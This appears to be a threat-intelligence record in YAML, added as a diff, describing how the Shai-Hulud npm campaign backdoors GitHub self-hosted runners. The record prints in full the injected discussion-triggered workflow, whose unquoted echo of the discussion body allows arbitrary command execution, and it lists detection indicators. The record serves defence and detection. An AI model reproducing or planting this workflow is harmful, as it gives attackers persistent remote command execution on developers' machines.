@@ -1,0 +1,136 @@
+name: GitHub Self-Hosted Runner Backdoor via Discussion Workflow Injection
+criticality: Severe
+references:
+  public:
+    1: https://www.wiz.io/blog/new-shai-hulud-npm-supply-chain-campaign
+    2: https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners
+    3: https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/
+
+metadata:
+  uuid: 6e33384c-10d5-4490-b8a3-9db227fa2063
+  schema: tvm::2.1
+  version: 1
+  created: 2025-12-03
+  modified: 2025-12-03
+  tlp: clear
+  organisation:
+    uuid: 56b0a0f0-b0bc-47d9-bb46-02f80ae2065a
+    name: EC DIGIT CSOC
+
+threat:
+  #actors:
+    #- name:
+      #sighting: |
+        #...
+      #references:
+        #-
+  killchain: Persistence
+  att&ck:
+    - T1053.005 # Scheduled Task/Job: Scheduled Task
+    - T1059.007 # Command and Scripting Interpreter: JavaScript
+    - T1546.015 # Event Triggered Execution: Component Object Model Hijacking
+    - T1136.003 # Create Account: Cloud Account
+    - T1072     # Software Deployment Tools
+    - T1505.004 # Server Software Component: IIS Components
+  chaining:
+    - relation: prerequisite::requires
+      vector: 03888619-c386-469d-b4e4-0203a6207d48 # NPM Supply Chain Compromise via Preinstall Scripts
+      description: |
+        This backdoor is deployed as part of the Shai-Hulud npm supply chain
+        compromise. The malicious npm package first compromises the victim's
+        environment, then establishes this persistence mechanism.
+  #cve:
+    #-
+  domains:
+    - Enterprise
+    - Public Cloud
+    - SaaS
+  terrain: |
+    A GitHub repository with permissions to create workflows and discussions,
+    combined with infrastructure to host self-hosted runners. The attacker
+    requires prior compromise of developer environment through malicious npm
+    package installation to register the self-hosted runner and inject the
+    malicious workflow file.
+  targets:
+    - CI/CD Pipelines
+    - Code Repositories
+    - Workstations
+    - Developer
+    - Virtual Machines
+  platforms:
+    - Github
+    - Windows
+    - Linux
+    - macOS
+  severity: Highly significant incident
+  leverage:
+    - Dwelling
+    - Infrastructure Compromise
+    - Software installation
+    - Modify configuration
+  impact:
+    - Lose Capabilities
+    - Business disruption
+    - Data Breach
+    - IP Loss
+  viability: Likely
+  description: |
+    The Shai-Hulud campaign establishes a persistent backdoor mechanism by
+    registering compromised machines as GitHub self-hosted runners and injecting
+    a malicious workflow that allows arbitrary command execution through GitHub
+    Discussions.
+
+    ## Attack Mechanism
+
+    The malware performs two key actions to establish persistence:
+
+    1. **Self-Hosted Runner Registration**: The payload registers the infected
+       machine as a self-hosted runner named 'SHA1HULUD' on the victim's
+       GitHub repository.
+
+    2. **Workflow Injection**: A malicious workflow file named 
+       `.github/workflows/discussion.yaml` is pushed to the repository via
+       the GitHub API.
+
+    ## Malicious Workflow Content
+
+    The injected workflow contains a command injection vulnerability and
+    runs specifically on self-hosted runners:
+
+    ```yaml
+    name: Discussion Create
+    on:
+      discussion:
+    jobs:
+      process:
+        env:
+          RUNNER_TRACKING_ID: 0
+        runs-on: self-hosted
+        steps:
+          - uses: actions/checkout@v5
+          - name: Handle Discussion
+            run: echo ${{ github.event.discussion.body }}
+    ```
+
+    ## Exploitation Method
+
+    The workflow triggers when a new discussion is created in the repository.
+    Due to the injection vulnerability in the `echo` command, the attacker
+    can execute arbitrary commands on the compromised self-hosted runner by:
+    1. Creating a new discussion in the infected repository
+    2. Including shell commands in the discussion body
+    3. The workflow executes these commands on the self-hosted runner
+
+    ## Persistence Implications
+
+    Any public repository utilizing this workflow could still be used in the
+    future to act as a backdoor to its associated infected machines. This
+    provides long-term persistent access to the compromised environment even
+    after the initial npm supply chain attack is discovered.
+
+    ## Detection Indicators
+
+    - Self-hosted runners named 'SHA1HULUD'
+    - Workflow files named 'discussion.yaml' with discussion triggers
+    - Workflows using `${{ github.event.discussion.body }}` in run commands
+    - Unexpected workflow files pushed to repositories
